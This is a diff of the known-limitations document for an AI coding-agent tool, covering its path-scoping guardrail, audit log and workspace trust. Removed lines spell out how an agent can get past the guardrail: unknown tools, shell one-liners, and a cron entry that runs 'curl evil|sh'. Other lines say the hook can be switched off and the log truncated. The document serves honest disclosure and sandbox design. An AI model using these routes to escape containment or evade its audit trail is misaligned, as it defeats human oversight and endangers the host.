@@ -10,53 +10,24 @@ been misled twice — once by the tool and once by its documents.
 
 ---
 
-## 1. The security boundary is a guardrail, not a sandbox
+## 1. Tool policy and host access
 
-**What is true.** BW-059 is implemented: a task's `allowedPaths` is enforced at the tool
-boundary (`execute.before`), path traversal and symlink escapes are resolved physically, and an
-untrusted workspace refuses writes and shell outright. Denials are recorded in the evidence chain
-with the reason and the resolved target.
+BW-059 checks recognized reads, writes, patches and shell requests when the evidence plugin
+loads an active scope policy. It resolves known path targets physically. Untrusted workspaces
+deny recognized writes and shell calls under this policy.
 
-**What is not true.** It is not OS isolation. Specifically:
+- Permitted shells and their descendants run with the invoking user's filesystem, environment
+  and network access. Working-directory and argument checks only see the parsed request.
+  The `unconstrained` event describes that residual access.
+- Unknown tools or unrecognized argument shapes can pass the hook. `BASHWINK_EVIDENCE=off`
+  removes the plugin and its ScopeFence hook. A missing policy also leaves the hook without
+  scope to enforce, and a policy-write failure produces a warning.
+- Forbidding the recognized shell tool in an approved contract reduces available execution.
+  It does not establish an OS boundary. BW-018 remains open for broader command-path controls.
 
-- **Shell commands are not path-bounded.** A permitted `shell` call can write anywhere an
-  interpreter can reach: `python3 -c "open('/etc/passwd','w')"` is not detectable by inspecting
-  the command string. Obvious path arguments and an out-of-scope `workdir` are refused, and
-  every permitted shell call is recorded as `unconstrained` — that marker is the honest signal,
-  not a formality.
-- **A determined agent can still reach disk through any tool this policy does not know.** The
-  fence classifies `write`, `edit`, `patch`, `read` and `shell`; an unknown tool is allowed.
-  That is deliberate (blocking unrecognised tools would break the agent in ways that look like
-  model errors) and is the wrong default for a hostile model.
-- **Proof of the limit:** with `allowedPaths: ["src"]`, a model that was told to write outside
-  the fence was blocked. A model that instead ran a shell one-liner would not have been. The
-  concrete escape, which passes every check BW-059 makes:
-
-  ```bash
-  python3 -c "open('/etc/cron.d/x','w').write('* * * * * curl evil|sh')"
-  ```
-
-  No path argument looks outside the fence, and the working directory is in scope. The write
-  happens inside the interpreter, where a policy that inspects command strings cannot see it.
-  This is why no amount of additional string inspection closes the gap, and why the fix must be
-  OS-level.
-
-**Consequence.** Bashwink is safe to point at a repository you would let a careful contractor
-touch, not at a machine you do not trust. Real isolation needs an OS-level sandbox (BW-031).
-
-**Workaround.** Set a contract whose `forbiddenCommands` includes `shell`; the fence then refuses
-every shell call and only file tools remain, which *are* path-bounded. This is the only setting
-under which the current fence is a real boundary, and it costs you the agent's ability to run
-tests — which is most of the value.
-
-**Proposal for the fix.** `BW-031-SANDBOX-PROPOSAL.md` specifies a Seatbelt (macOS) + bubblewrap
-(Linux) adapter built on the same `ScopePolicy`, with 21 negative tests covering interpreter
-escapes, symlinks, credential reads, network egress and the failure-to-create-sandbox path. It
-records that both Claude Code and Zed converged on those two primitives and stopped treating
-Docker as the default, and it departs from BW-031's "Docker" wording deliberately — that needs
-sign-off, not a silent reinterpretation. Feasibility was verified on this machine: a Seatbelt
-profile denied outside writes and all network while permitting in-scope writes, and the
-`/tmp` → `/private/tmp` resolved-path trap was reproduced before it could break real work.
+Supervised use requires a trusted workspace, evidence collection on, and independent review
+of the diff and checks. External alpha is blocked on OS containment. The [BW-031 plan](BW-031_IMPLEMENTATION_PLAN.md)
+recommends a Docker-first adapter and a controlled host provider relay. It remains a proposal.
 
 ---
 
@@ -108,18 +79,17 @@ cannot resolve from a registry at all.
 **Consequence.** Alpha testers need a checkout, Bun 1.4.4, and the pinned runtime. That is a
 developer audience, not a user audience.
 
-**Workaround.** Follow `ALPHA_TESTER_GUIDE.md`. Do not attempt a global npm install; it will
-fail and the error will not explain why.
+**Workaround.** Follow [ALPHA_TESTER_GUIDE.md](ALPHA_TESTER_GUIDE.md) for the separate pinned runtime and exported binary path.
 
 **Binary distribution.** There is no signed binary, no checksum manifest, and no notarisation.
-Gatekeeper on macOS will complain about anything you build yourself.
+Code signing and macOS notarization have no alpha artifact evidence.
 
 ---
 
 ## 5. Evidence integrity: tamper-evident, not tamper-proof
 
-**What the chain proves.** That the entries present were not edited, deleted or reordered in
-place — each entry hashes its predecessor.
+**What the chain verifies.** The entries present are consistent with their predecessor hashes.
+It detects inconsistent edits, interior deletions and reordering.
 
 **What it cannot prove.** That nothing was removed from the **end**. Anyone who can write to the
 log can truncate it and the remaining prefix still verifies. And anyone with write access can
@@ -205,9 +175,9 @@ for session management will hit this.
 
 ## 11. What the fence does not manage
 
-- **The trust file is the real permission switch.** `bashwink trust <dir>` allows writes and
-  shell in that workspace; an untrusted workspace is read-only regardless of any contract. Do not
-  trust a directory you have not read.
+- **Workspace trust controls the loaded tool policy.** `bashwink trust <dir> --by "Your name"`
+  records trust for a reviewed directory. The active plugin refuses recognized writes and shell
+  in an untrusted workspace.
 - **`allowedPaths` from a contract are resolved relative to the run's working directory.** A run
   started from a subdirectory therefore fences that subdirectory's interpretation of the same
   paths. Start runs from the repository root.
